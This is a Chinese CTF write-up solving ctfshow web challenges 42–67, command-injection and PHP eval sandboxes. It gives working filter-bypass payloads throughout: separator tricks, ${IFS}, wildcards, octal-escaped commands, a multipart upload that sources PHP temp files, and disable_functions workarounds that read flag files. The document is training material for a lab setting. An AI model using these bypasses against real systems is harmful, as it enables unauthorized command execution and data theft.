---
title: "ctfshow-WEB入门（命令执行）第二篇"
description: "ctfshow-WEB入门（命令执行）第二篇"
image: "/assets/不属于这个时代的愚者.jpg"
date: 2026-11-08
updated: 2026-11-08
categories:
  - 学习
tags:
  - CTF
  - Web
  - 网络安全
  - 命令执行
type: tech
---

## ctfshow-WEB入门（命令执行）第二篇

::link-banner
---
banner: /assets/西施，鸟.jpg
title: 上一篇
description: ctfshow-WEB入门（命令执行）第一篇
link: "https://blog.qianbenyuan.dpdns.org/2026/ctfshow-web-command-exec-1"
---
::

---

### web42

![image-20261107093430395](/assets/ctfshow-web-command-exec/image-20261107093430395.png)

**代码把我们的输出“扔进垃圾桶”了**

```php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    system($c." >/dev/null 2>&1");
}else{
    highlight_file(__FILE__);
}
```

- 没有过滤，`c` 直接进 `system()`
- 但后面**硬拼了 ` >/dev/null 2>&1`**

#### Q1：`>/dev/null 2>&1` 是什么？

| 部分 | 意思 |
| :--- | :--- |
| `>` | 重定向标准输出（stdout，fd=1） |
| `/dev/null` | Linux 的“黑洞”文件，写进去的内容全部丢弃 |
| `2>&1` | 把标准错误（stderr，fd=2）也重定向到 stdout |

合起来：**这条命令的所有输出（正常输出 + 报错）都被丢掉了**，页面上什么都看不到。

所以直接传 `cat flag.php`，实际执行的是：

```bash
cat flag.php >/dev/null 2>&1
```

输出全进黑洞 → 页面空白。

#### 绕过：用 `;` 把命令“截断”

```
?c=tac flag.php;
```

拼起来变成：

```bash
tac flag.php; >/dev/null 2>&1
```

![image-20261107095040501](/assets/ctfshow-web-command-exec/image-20261107095040501.png)

- `;` 是 shell 的**命令分隔符**，前面 `tac flag.php` 是第一条命令
- 后面 `>/dev/null 2>&1` 成了第二条“空命令”，只做重定向，什么都不输出
- 于是 `tac` 的输出正常回显

#### 其他等价写法

```
?c=tac flag.php;      ← 分号
?c=tac flag.php &&    ← 前一条成功才执行后面的空重定向，无害
?c=tac flag.php ||    ← 前一条成功就跳过后面
?c=tac flag.php %23   ← # 注释掉后面的重定向（# 必须编码成 %23）
?c=tac flag.php%0a    ← 换行，效果同分号
```

### web43

![image-20261107093415043](/assets/ctfshow-web-command-exec/image-20261107093415043.png)

**在 web42 基础上封了 `;` 和 `cat`**

```php
if(!preg_match("/\;|cat/i", $c)){
    system($c." >/dev/null 2>&1");
}
```

- 过滤：分号 `;`、`cat`（不区分大小写）
- 重定向还是那个 `>/dev/null 2>&1`

#### 两个封杀点怎么绕

| 被封 | 替代 |
| :--- | :--- |
| `cat` | `tac`、`nl`、`head`、`tail`、`more` |
| `;` | `&&`、`\|\|`、`#`、换行 `%0a` |

#### 可用的 payload

```
?c=tac flag.php ||
?c=tac flag.php &&
?c=tac flag.php %23
```

![image-20261107095740391](/assets/ctfshow-web-command-exec/image-20261107095740391.png)

三条都直接出 flag。

为什么能行：

- `tac flag.php || >/dev/null 2>&1`：`tac` 执行成功（退出码 0），`||` 后面的不执行 → 输出保留
- `tac flag.php && >/dev/null 2>&1`：`tac` 成功后执行后面那个“只有重定向的空命令” → 无害
- `tac flag.php # >/dev/null 2>&1`：`#` 之后全被注释掉 → 重定向消失。注意浏览器里 `#` 要写成 `%23`，否则会被当成 URL 锚点，根本不会发到服务器

#### 两题共用一套思路

| | web42 | web43 |
| :--- | :--- | :--- |
| 过滤 | 无 | `;`、`cat` |
| 核心障碍 | 追加的 `>/dev/null 2>&1` | 同左 + 两个禁词 |
| 关键解法 | `;` 截断 | `\|\|` / `&&` / `#` 截断；`tac` 代替 `cat` |

只要能让“我们自己的命令”和“追加的重定向”**分开成两条命令**，输出就不会被吞。

### web44

![image-20261107100127874](/assets/ctfshow-web-command-exec/image-20261107100127874.png)

**在 web43 基础上又封了 `flag`**

```php
if(!preg_match("/;|cat|flag/i", $c)){
    system($c." >/dev/null 2>&1");
}
```

- 过滤：`;`、`cat`、`flag`（不区分大小写）
- 重定向还是 `>/dev/null 2>&1`

#### 三个封杀点

| 被封 | 替代 |
| :--- | :--- |
| `;` | `&&`、`\|\|`、`#`（URL 里写 `%23`）、`%0a` |
| `cat` | `tac`、`nl`、`head`、`tail`、`more`、`less`、`od`、`grep`、`sort`、`uniq` |
| `flag` | `fla*`、`f*`、`fl?g` |

#### 可用的 payload

```
?c=ls||
?c=tac fla*||
?c=tac fla*&&
?c=tac fla* %23
```

#### 原理：

- `tac fla*||` 拼成 `tac fla*|| >/dev/null 2>&1`：`||` 后面是一条空的重定向命令，`tac` 成功时右侧不执行 → 输出保留
- `&&` 同理：`tac` 成功后执行右侧的“空命令”，无害
- `#` 直接把追加的重定向注释掉（浏览器里要写 `%23`）
- `fla*` 让 `flag` 四个字母不连续出现，绕过 `flag` 过滤

### web45

![image-20261107100145305](/assets/ctfshow-web-command-exec/image-20261107100145305.png)

**再封掉空格**

```php
if(!preg_match("/\;|cat|flag| /i", $c)){
    system($c." >/dev/null 2>&1");
}
```

- 过滤：`;`、`cat`、`flag`、**空格**
- 这里挡的是正则里的字面空格（0x20）

#### Q1:空格可以用什么替代？

| 写法 | 说明 |
| :--- | :--- |
| `%09` | Tab（制表符），shell 同样当分隔符 |
| `${IFS}` | shell 内置变量，值是「空格 + Tab + 换行」 |
| `$IFS$9` | 同理，`$9` 是空参数，用来断开变量名 |

**注意**：`$IFS` 后面直接跟 `fla*` 会被当成变量名 `IFSfla`，要写成 `${IFS}` 或 `$IFS$9`。

#### 可用的 payload

```
?c=tac%09fla*||
?c=tac${IFS}fla*||
```

#### 原理

- 拼接后是 `tac<Tab>fla*|| >/dev/null 2>&1`
- Tab 在 shell 里当空白，`tac` 和 `fla*` 正常分开
- `||` 让追加的重定向变成独立的空命令

### web46

![image-20261107101455838](/assets/ctfshow-web-command-exec/image-20261107101455838.png)

**又封了：空格、数字、`$`、`*`**

```php
if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*/i", $c)){
    system($c." >/dev/null 2>&1");
}
```

- 过滤：`;`、`cat`、`flag`、空格、数字 `[0-9]`、`$`、`*`
- 注意 `\\$` 在正则里是字面 `$`，`\*` 是字面 `*`

**前面常用的几招都被堵住了：**

| 想用 | 不行 |
| :--- | :--- |
| `${IFS}` / `$IFS$9` | `$` 被封 |
| `fla*` / 任何 `*` | `*` 被封 |
| `cat fla*` | `cat`、空格都被封 |
| `;` 截断 | `;` 被封（改用 `\|\|`、`&&`、`#`） |

#### 两个替代

**空格 → `%09`（Tab）**：`$` 被封，`${IFS}` 用不了，但 Tab 还能用。

**文件名 → `?` 通配符**：`*` 被封，但 `?` 还能用；`fla?.php` 匹配 `flag.php`，而且字符串里没有连续的 `flag`：

- `fla?.php` → `fla` + 任意一个字符 + `.php` → `flag.php`
- 同类写法：`?lag.php`、`fl[a]g.php`

#### 可用的 payload

```
?c=ls||
?c=tac%09fla?.php||
```

#### 原理

- `%09` 解码成 Tab，shell 把它当空白
- `fla?.php` 在 shell 里展开成 `flag.php`
- `||` 让追加的 `>/dev/null 2>&1` 变成独立空命令

### web47

![image-20261107101517252](/assets/ctfshow-web-command-exec/image-20261107101517252.png)

**在 web46 基础上又封了 5 个读文件命令**

```php
if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i", $c)){
    system($c." >/dev/null 2>&1");
}
```

- 过滤：web46 的全部 + `more`、`less`、`head`、`sort`、`tail`

#### Q1：还能用哪些什么命令执行？

被封的都是“分页/排序”类命令，但 `tac`、`nl`、`od`、`grep`、`awk`、`sed`、`rev`、`paste`、`base64` 都还能用。

所以 **web46 的 payload 原样可用**：

```
?c=tac%09fla?.php||
?c=nl%09fla?.php||
```

#### 原理

和 web46 完全一样：Tab 当空格、`?` 当通配符、`||` 截断重定向。`tac` 和 `nl` 都不在封禁名单里，所以直接读出来了。

这题只是“多封了几个命令”，思路没变——换一个没被封的读文件命令就行。

### web48

![image-20261107103056447](/assets/ctfshow-web-command-exec/image-20261107103056447.png)

**又封了 7 个命令 + 反引号**

```php
if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i", $c)){
    system($c." >/dev/null 2>&1");
}
```

- 在 web47 基础上又封：`sed`、`cut`、`awk`、`strings`、`od`、`curl`、反引号
- **注意：`tac`、`nl` 没有被封**

#### 直接用上一题的 payload

```
?c=tac%09fla?.php||
?c=nl%09fla?.php||
```

两条都直接出 flag。

#### 原理

封的是一堆“文本处理 / 下载”类命令，但 `tac`（倒序输出）和 `nl`（带行号输出）都不在名单里。所以思路完全不变：Tab 当空格、`?` 当通配符、`||` 截断重定向。

### web49

![image-20261107103040545](/assets/ctfshow-web-command-exec/image-20261107103040545.png)

**在 web48 基础上再封一个 `%`**

```php
if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i", $c)){
    system($c." >/dev/null 2>&1");
}
```

- 过滤：web48 的全部 + `%`

#### Q1：为什么 `%09` 还能用？

这里有个容易误解的点：**过滤发生在 URL 解码之后**。

- 你提交的是 `%09`
- PHP 取到 `$_GET['c']` 时，`%09` 已经被解码成了 **Tab 字符**
- 正则里的 `%` 检查的是“解码后的字符串里有没有百分号”，而此时 `c` 里已经没有 `%` 了，只有 Tab

所以上一题的 payload 依旧有效：

```
?c=tac%09fla?.php||
?c=nl%09fla?.php||
```

> 什么时候 `%` 过滤才有用？只有当你提交 `%25`（解码后变成字面 `%`），或者命令里直接写百分号时，才会命中。

#### 原理

同 web48，只是多了个 `%` 的干扰项。关键是分清“原始输入”和“解码后的值”——**过滤器看的是解码后的值**。

### web50

![image-20261107104750154](/assets/ctfshow-web-command-exec/image-20261107104750154.png)

**这次连 Tab 和 `&` 都封了**

```php
if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c)){
    system($c." >/dev/null 2>&1");
}
```

- 在 web49 基础上新增：`\x09`（Tab）、`\x26`（`&`）
- 也就是说：空格、Tab、`${IFS}`、`&&` 全都不行了

#### 还剩什么

| 想用 | 状态 |
| :--- | :--- |
| 空格 / Tab | 都被封 |
| `${IFS}` / `$IFS$9` | `$` 被封 |
| `&&` | `&` 被封 |
| `\|\|` | 还能用 |
| `<` 输入重定向 | 能用，而且不需要空格 |

#### 思路：用 `<` 代替空格

`命令<文件` 会把文件内容喂给命令，中间不需要空格。

但有个坑：**`<` 后面的通配符 `fla?.php` 不会展开**（容器的 `/bin/sh` 是 dash，重定向目标不做 glob 展开），会报“文件不存在”。

所以文件名要写成**字面量**，但又不能出现连续的 `flag`。两个办法：

```
?c=tac<fla\g.php||     ← 反斜杠：shell 去掉 \，还原成 flag.php
?c=tac<"fla""g.php"||  ← 引号拼接：相邻字符串自动连成 flag.php
```

> 正则看到的是 `fla\g.php` / `"fla""g.php"`，里面没有连续的 `flag`；shell 解析时再把它们还原成 `flag.php`。

#### 为什么最后要 `||`

代码会在末尾拼 ` >/dev/null 2>&1`。`||` 让这段重定向变成**另一条命令**，我们自己的 `tac` 输出才不会被吞。





### web51

![image-20261107104728554](/assets/ctfshow-web-command-exec/image-20261107104728554.png)

**再封一个 `tac`**

```php
if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c)){
    system($c." >/dev/null 2>&1");
}
```

- 在 web50 基础上多封了 `tac`

#### 换个没被封的读文件命令

`nl`、`rev`、`paste` 都还能用，`<` + 反斜杠的技巧完全一样：

```
?c=nl<fla\g.php||
?c=rev<fla\g.php||
?c=paste<fla\g.php||
```

- `nl` 带行号输出（最直观）
- `rev` 输出是整行倒序的，需要自己反过来读
- `paste` 原样输出

#### 为什么能行

- `<` 把 `flag.php` 喂给命令，不需要空格
- `fla\g.php` 绕过 `flag` 过滤
- `||` 把追加的重定向变成独立命令

### web52

![image-20261107110333367](/assets/ctfshow-web-command-exec/image-20261107110333367.png)

**过滤大改：放开 `$`，但封了 `<` `>`**

```php
if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c)){
    system($c." >/dev/null 2>&1");
}
```

- 和 web51 相比：**去掉了 `$` 的过滤**，但**新增 `>` 和 `<`**
- 也就是：`${IFS}` 复活了，但 `<` 重定向不能用了

#### 思路：回到 `${IFS}` + `?` 通配符

- 空格仍被封 → `${IFS}` 代替（`$` 不再被封）
- `*` 仍被封 → `?` 通配符（这次是普通参数，dash 会正常展开）
- `tac` 仍被封 → `nl` / `rev` / `paste`
- `<` `>` 被封 → 不能用重定向，只能走“命令 + 参数”的老路
- `||` 还能用 → 截断后面追加的 `>/dev/null 2>&1`

#### payload

```
?c=nl${IFS}fla?.php||
?c=rev${IFS}fla?.php||
?c=paste${IFS}fla?.php||
```

#### 注意：flag.php 里是假的

这题的 `flag.php` 内容是 `$flag="flag_here";`，占位符而已，真 flag 在根目录 `/flag`。

先看根目录：

```
?c=ls${IFS}/||
```

根目录里有个 `flag` 文件，但 `flag` 这个词被过滤，不能直接写。用 `?` 绕：

```
?c=nl${IFS}/fla?||
```

`/fla?` 匹配 `/flag`，字符串里没有连续的 `flag`，成功读出真 flag。



### web53

![image-20261107110352983](/assets/ctfshow-web-command-exec/image-20261107110352983.png)

**没有追加重定向了，直接回显**

```php
if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c)){
    echo($c);
    $d = system($c);
    echo "<br>".$d;
}
```

- 和 web52 比：多封了 `wget`；**`system($c)` 后面不再拼 `>/dev/null 2>&1`**
- 所以不需要 `||` 截断了，命令输出直接进页面（先 echo 你的 payload，再 `<br>`，再执行结果）

#### payload

```
?c=nl${IFS}fla?.php
```

#### 注意

- 目录里除了 `flag.php`、`index.php`，还有一个 `readflag` 文件；但 `readflag` 里含 `flag`，直接写会返回 `no`
- 想执行它可以用 `./readfla?`（`?` 通配），不过实测没有输出；拿 flag 直接用 `nl` 读 `flag.php` 就行

### web54

![image-20261107122536791](/assets/ctfshow-web-command-exec/image-20261107122536791.png)

**过滤升级成“子序列匹配”**

```php
if(!preg_match("/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\>|\</i", $c)){
    system($c);
}
```

关键变化：

- 命令名不再按“整词”匹配，而是 `.*c.*a.*t.*` 这种**子序列**匹配——只要字符串里出现 c，后面再出现 a，再后面出现 t，就算命中
- **不再追加 `>/dev/null 2>&1`**，`system($c)` 直接回显
- 空格、Tab、`&`、`<` `>`、数字、`*`、反引号、`%` 仍然被封

被封的常用词（按子序列）：cat、flag、more、wget、less、head、sort、tail、sed、cut、tac、awk、strings、od、curl、nl、scp、rm。

#### 能用哪些东西？

| 命令 | 为什么能过 |
| :--- | :--- |
| `paste` | p-a-s-t-e，不满足任何子序列模式 |
| `rev` | r-e-v，也不满足 |
| `ls` / `cp` / `grep` / `find` | 同样不在名单里 |

- `$` 没被封 → `${IFS}` 当空格
- 这次没有追加重定向 → 不需要 `||`

#### payload

```
?c=ls
?c=paste${IFS}fla?.php
?c=rev${IFS}fla?.php
```

`fla?.php` 里的 `?` 替代了 `g`：既破坏了 `flag` 这个子串，也破坏了 `f…l…a…g` 这个子序列，所以能过。

### web55

![image-20261107122605841](/assets/ctfshow-web-command-exec/image-20261107122605841.png)

**所有字母都封了**

```php
if(!preg_match("/\;|[a-z]|\`|\%|\x09|\x26|\>|\</i", $c)){
    system($c);
}
```

- 封：`;`、所有字母（大小写）、反引号、`%`、Tab、`&`、`>`、`<`
- **空格没封，数字没封，`$`、单引号、反斜杠也没封**

#### 思路：用 ANSI-C 引号的八进制转义

容器的 shell 支持 `$'\143'` 这种写法：`\143` 是八进制，等于字符 `c`。

```
$'\143\141\164'   →   cat
```

整个 payload 里只有 `$`、`'`、`\`、数字，没有一个字母。

文件名用 `????.???` 通配：4 个字符 + 点 + 3 个字符 = `flag.php`（`index.php` 是 5 个字符，不匹配）。

#### payload

```
?c=$'\143\141\164' ????.???
```

执行过程：

1. 过滤看到 `$'\143\141\164' ????.???`，没有字母 → 放行
2. shell 把 `$'...'` 按八进制还原成 `cat`
3. `????.???` 展开成 `flag.php`
4. 执行 `cat flag.php`

#### 常用八进制对照

| 字符 | 十进制 | 八进制 |
| :--- | :--- | :--- |
| c | 99 | \143 |
| a | 97 | \141 |
| t | 116 | \164 |
| l | 108 | \154 |
| s | 115 | \163 |
| 空格 | 32 | \040 |

> 顺带：`/???/???` 这种写法看起来能匹配命令名，但会一次匹配到多个（apt、awk…），“第一个当命令、其余当参数”，实际不可控（在 BusyBox 镜像里首个匹配甚至可能是 `bc`、`arping` 这类）；推荐用 `$'...'` 精确构造。

### web56

![image-20261107154608421](/assets/ctfshow-web-command-exec/image-20261107154608421.png)

**无字母无数字，但 `.` 和上传临时文件还在**

```php
if(!preg_match("/\;|[a-z]|[0-9]|\\$|\(|\{|\'|\"|\`|\%|\x09|\x26|\>|\</i", $c)){
    system($c);
}
```

- 封：`;`、所有字母（大小写）、数字、`$`、`(`、`{`、引号、反引号、`%`、Tab、`&`、`>`、`<`
- 没封：`.`、空格、`/`、`?`、`[`、`]`、`@`、`-`、`|`、`#`、换行等

#### 思路：`.`(source) + 文件上传的临时文件

1. `.` 是 shell 的 source 命令（读入一个文件并执行），它不含任何字母
2. PHP 处理文件上传时，会先把上传内容存成**临时文件**，命名类似 `/tmp/phpXXXXXX`（`php` + 6 位随机字符）
3. 这个临时文件在**本次请求处理期间是存在的**（请求结束才删除）
4. 我们上传一个内容为 `cat flag.php` 的文件，同时让 `c` 去 source 这个临时文件

#### 为什么是 `/???/????????[@-[]`

- `/???` → `/tmp`
- `????????` → 8 个任意字符
- `[@-[]` → 字符类，`@` 到 `[` 的 ASCII 区间正好包含 **A-Z**（大写字母）

拼起来就是 `php` + 6 位随机字符（最后一位用大写字母过滤，提高命中率）。

#### 复现步骤

1. 本地建 `payload.txt`，内容：
   ```
   cat flag.php
   ```
2. 发 multipart POST（Burp 里就是改第一行再带上传体）：
   ```
   POST /?c=.%20/???/????????[@-[] HTTP/1.1
   Host: xxx.challenge.ctf.show
   Content-Type: multipart/form-data; boundary=----xxx

   ------xxx
   Content-Disposition: form-data; name="file"; filename="a.txt"
   Content-Type: text/plain

   cat flag.php
   ------xxx--
   ```
3. 响应里就是 `cat flag.php` 的输出

curl 一行版：

```bash
printf 'cat flag.php\n' > payload.txt
curl -sk -F "file=@payload.txt" "http://靶机/?c=.%20/???/????????[@-[]"
```

实测**第一次就出**——临时文件在请求处理期间一直存在，竞态窗口其实很大。如果碰上最后一位不是大写字母，多提交几次即可。



### web57

![image-20261107154625657](/assets/ctfshow-web-command-exec/image-20261107154625657.png)

**代码会拼 `.php`，flag 在 `36.php`**

```php
if(!preg_match("/\;|[a-z]|[0-9]|\`|\|\#|\'|\"|\%|\x09|\x26|\x0a|\>|\<|\.|\,|\?|\*|\-|\=|\[/i", $c)){
    system("cat ".$c.".php");
}
```

- 封：`;`、字母、数字、反引号、`|#`、引号、`%`、Tab、`&`、换行、`>`、`<`、`.`、`,`、`?`、`*`、`-`、`=`、`[`
- 注释写明：flag 在 `36.php`
- 代码是 `cat $c.php`，只要让 `$c` 展开成 `36` 就行

#### 思路：用 shell 算术展开拼出 36

`$`、`(`、`)`、`!`、`#`、`+` 都没有被封，可以用算术展开：

- `$#` 是特殊变量，表示位置参数个数 → 在 `sh -c` 里是 **0**
- 算术上下文里 `!` 是逻辑非 → `!0` = **1**
- 把 36 个 `!$#` 加起来 → 36

payload 形式：

```
?c=$((!$#+!$#+!$#+……+!$#))
```

（一共 36 个 `!$#`，总长约 150 字符）

生成脚本：

```python
terms = "+".join(["!$#"] * 36)
print("c=$((%s))" % terms)
```

执行过程：

1. `$((...))` 先做算术展开 → `36`
2. 命令变成 `cat 36.php`
3. 输出 flag

#### 注意

`#` 在 URL 里会被浏览器当成锚点，必须编码成 `%23`（curl 的 `--data-urlencode` 会自动处理）。这一步和 web49 的 `%09` 同理：**服务器先做 URL 解码，再做正则**，所以 `%23` 解码成 `#` 后照样能过。

### web58

![image-20261107221754900](/assets/ctfshow-web-command-exec/image-20261107221754900.png)

**没有正则过滤了，但 `disable_functions` 把危险函数禁了**

```php
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
}
```

- **只收 POST**，没有任何 `preg_match`
- 但 `system()` 这类函数被 `disable_functions` 禁用：

```
Warning: system() has been disabled for security reasons
```

#### 关键：eval 是 PHP 代码执行，不一定非要 shell

被禁的是“执行系统命令”的那批函数，PHP 自带的读文件函数还在：

```
c=echo(file_get_contents('flag.php'));
c=readfile('flag.php');
c=highlight_file('flag.php');
```

三条都直接出 flag。

#### 本题的 disable_functions（实测）

```
phpinfo,apache_child_terminate,apache_setenv,chgrp,chmod,chown,
curl_exec,curl_multi_exec,dl,exec,imap_mail,imap_open,
ini_alter,ini_restore,ini_set,link,mail,openlog,parse_ini_file,
passthru,pcntl_*,popen,posix_kill,proc_*,putenv,readlink,
shell_exec,symlink,syslog,system
```

命令执行系（system/exec/shell_exec/passthru/popen/proc_open）全在里面，但 `file_get_contents`、`readfile`、`highlight_file` 都还能用。

#### 怎么自己看禁用了什么

```
c=echo(ini_get('disable_functions'));
```

`ini_get` 本身没有被禁。





### web59

![image-20261107221838465](/assets/ctfshow-web-command-exec/image-20261107221838465.png)

**在 web58 基础上又禁了 `file_get_contents` 和 `readfile`**

源码和 web58 一模一样（POST + `eval($c)`），区别只在 `disable_functions` 末尾多了两个：

```
...,system,file_get_contents,readfile
```

所以 web58 的写法在这里会失败：

```
Warning: file_get_contents() has been disabled for security reasons
```

#### 换其他读文件方法（全部实测出 flag）

| 方法 | payload |
| :--- | :--- |
| 高亮源码 | `c=highlight_file('flag.php');` |
| `file()` 读成数组再拼 | `c=echo(implode('',file('flag.php')));` |
| `fopen` + `fread` | `c=$f=fopen('flag.php','r');echo(fread($f,9999));` |
| `include` 执行后取变量 | `c=include('flag.php');echo($flag);` |

- `highlight_file` / `show_source`：直接把源码打印出来
- `file()`：按行读成数组，`implode` 拼成一个字符串
- `fopen` + `fread`：文件句柄方式读
- `include`：包含执行 `flag.php`，里面的 `$flag` 被赋值，再 `echo` 出来

#### 一句话

`disable_functions` 也是黑名单：**禁了 `system` 不等于禁了“读文件”，禁了 `file_get_contents` 也不等于禁了所有读法**。黑名单永远有漏。

### web60

![image-20261107224429905](/assets/ctfshow-web-command-exec/image-20261107224429905.png)

**在 web59 基础上继续加禁用**

源码还是 POST + `eval($c)`，只在 `disable_functions` 末尾追加：

```
...,file_get_contents,readfile,fread,fgets,fgetss,file,
readfile,fpassthru,parse_ini_file
```

（`readfile` 写了两遍）

也就是说：`file_get_contents`、`readfile`、`file`、`fread`、`fgets`、`fpassthru` 这些常规读法全灭了。

#### 但 `highlight_file` 没被禁

```
c=highlight_file('flag.php');
```

直接出 flag。

#### 为什么它一定没被禁

看题目自己的代码：`else{ highlight_file(__FILE__); }`——**它要靠 highlight_file 把源码显示给你看**。禁了它，题目页面都打不开。所以出题人不可能禁用这个函数。

同理，`show_source` 是它的别名，也可以用。



### web61

![image-20261107224447640](/assets/ctfshow-web-command-exec/image-20261107224447640.png)

**继续加禁用：连 `fopen` 都禁了**

在 web60 基础上再追加：

```
...,copy,rename,fopen,fgetc,serialize
```

现在 `fopen` 也没了，常规的 `fopen + fread` 路线彻底断掉。

#### 能用的方法（实测）

| 方法 | payload |
| :--- | :--- |
| 高亮源码 | `c=highlight_file('flag.php');` |
| 别名 | `c=show_source('flag.php');` |
| `SplFileObject` | `c=$f=new SplFileObject('flag.php');foreach($f as $l){echo $l;}` |
| 列目录 | `c=print_r(glob('*'));` |

- `SplFileObject` 是 SPL 的面向对象文件类，内部实现不走 `fopen` 这个**函数名**，所以黑名单管不到
- `glob` 也没被禁，可以列目录确认文件名

#### 一句话

`disable_functions` 加到这份上，`highlight_file` 依然必须可用（题目自己要显示源码），所以 web58~61 四题其实是**同一条 payload**：

```
c=highlight_file('flag.php');
```

这四题真正想教的是：**黑名单只加“常见的”，永远漏“不常见的”**——`highlight_file`、`SplFileObject`、`glob` 都是漏网之鱼。

### web62

![image-20261107230411028](/assets/ctfshow-web-command-exec/image-20261107230411028.png)

**禁用表扩充到 64 个**

源码不变（POST + `eval($c)`），`disable_functions` 完整列表（实测 64 项）：

```
apache_child_terminate,apache_setenv,chgrp,chmod,chown,copy,curl_exec,
curl_init,curl_multi_exec,dl,error_log,error_reporting,exec,fclose,
fgetc,fgets,fgetss,file,file_get_contents,file_put_contents,fopen,
fpassthru,fread,fsockopen,fwrite,imap_mail,imap_open,ini_alter,
ini_restore,ini_set,link,mail,openlog,parse_ini_file,passthru,
pcntl_*,phpinfo,popen,posix_kill,proc_*,putenv,readfile,readlink,
rename,serialize,shell_exec,symlink,syslog,system,tempnam
```

注意：连 `error_reporting`、`error_log`、`file_put_contents`、`fwrite`、`fclose`、`fsockopen`、`curl_init` 都禁了。

但 **`highlight_file` / `show_source` 依然不在名单里**：

```
c=highlight_file('flag.php');
```

直接出 flag。

#### 为什么这招永远有效

题目自己的 `else` 分支就是 `highlight_file(__FILE__)`——禁了它，题目页面都打不开。



### web63

![image-20261107230420302](/assets/ctfshow-web-command-exec/image-20261107230420302.png)

**只多禁了一个 `gc_collect_cycles`**

web63 的禁用表 = web62 + `gc_collect_cycles`（共 65 个）。

`gc_collect_cycles` 是经典的 `disable_functions` 绕过链（GC + 析构函数）里会用到的函数，出题人加它是在防“进阶绕过”。

但本题根本用不上那么复杂——`highlight_file` 依然可用：

```
c=highlight_file('flag.php');
```

直接出 flag。

#### 小结：web58~63 六题

源码一模一样（POST + `eval($c)`，无 preg 过滤），只是 `disable_functions` 越来越长；解法始终是：

```
c=highlight_file('flag.php');
```

真正要记的是：**题目自己要用的函数，出题人不敢禁**——`highlight_file` 就是那个“必须留着”的函数。次选是 `show_source`、`SplFileObject`、`glob` 这些“不在黑名单里”的等价物。

### web64

![image-20261107232033721](/assets/ctfshow-web-command-exec/image-20261107232033721.png)

**禁用表 66 项，多了一个 `getTrace`**

源码不变。相比 web63，`disable_functions` 里多了一个 `getTrace`。

- 注意：`getTrace` 不是全局函数（它是 `Exception::getTrace()` 方法），写进 `disable_functions` 其实没有实际作用
- 这说明出题人在“照着绕过链的清单加函数”，连方法名也一起抄了进去

`highlight_file` 还是能用：

```
c=highlight_file('flag.php');
```

> 小细节：用 `count(explode(',', ini_get('disable_functions')))` 会显示 68，是因为列表末尾还有逗号，`explode` 多算了一个空字符串；去重后的真实数量是 66。



### web65

![image-20261107232020716](/assets/ctfshow-web-command-exec/image-20261107232020716.png)

**再禁一个 `debug_backtrace`**

web65 = web64 + `debug_backtrace`（去重后 67 项）。

`debug_backtrace` 是 `disable_functions` 绕过链（配合 GC、异常回溯等）里会用到的函数，出题人继续堵“进阶绕过”。

但 `highlight_file` 依然不在名单里：

```
c=highlight_file('flag.php');
```

#### 小结：web58~65 八题

源码完全一样，只是 `disable_functions` 一路加长，而且越加越“玄学”（连 `getTrace` 这种不是全局函数的名字都加进去了）。解法始终没变：

```
c=highlight_file('flag.php');
```

规律：**出题人必须保留自己题目要用的函数**（`highlight_file`），黑名单加得再长，这个洞永远在。

### web66

![image-20261108094431393](/assets/ctfshow-web-command-exec/image-20261108094431393.png)

**flag.php 是假的，还禁了 include/require/show_source**

源码不改。web66 的 `disable_functions` 在 web65 基础上新增：

```
include,include_once,require,require_once,show_source
```

几个要点：

- `include` / `require` 系列是**语言构造**，写进 `disable_functions` 其实禁不掉（PHP 手册明确说 disable_functions 只对函数有效）
- `show_source` 是 `highlight_file` 的**别名**，这里只禁了别名，`highlight_file` 本体还在
- 去重后共 72 项

#### 但 flag.php 是假的

```
c=highlight_file('flag.php');
```

输出的是：

```php
$flag="秀秀得了,这次不在这里";
```

真 flag 不在 `flag.php`。

#### 找真 flag：先列目录

`scandir` 没被禁：

```
c=print_r(scandir('/'));
```

根目录里能看到 `flag.txt`（真 flag 文件）。

#### 读 /flag.txt

`file_get_contents`、`readfile`、`file`、`fopen` 全被禁了，但 `highlight_file` 还在，而且它**不限于 .php 文件**：

```
c=highlight_file('/flag.txt');
```

直接出 flag。

#### 一句话

这题考两件事：①`show_source` 被禁不代表 `highlight_file` 被禁（别名和本体是两个名字）；②别只盯着 `flag.php`，发现内容不对就 `scandir` 列目录找真文件。

### web67

![image-20261108094859400](/assets/ctfshow-web-command-exec/image-20261108094859400.png)

**flag.php 还是假的，`print_r`/`var_dump` 开始被禁**

相比 web66，`disable_functions` 新增：

```
chr,fgetcsv,fscanf,print_r,pwn,str_repeat
```

（去重后 78 项；`pwn` 不是 PHP 函数，又是个凑数的）

#### 老问题：flag.php 是假的

```
c=highlight_file('flag.php');
```

输出 `$flag="秀秀得了,这次不在这里";`。

#### `print_r` 被禁，用 `echo + implode` 列目录

```
c=echo implode(' ',scandir('/'));
```

输出：

```
. .. .dockerenv bin dev etc flag.txt home lib ...
```

看到 `/flag.txt`，直接读：

```
c=highlight_file('/flag.txt');
```

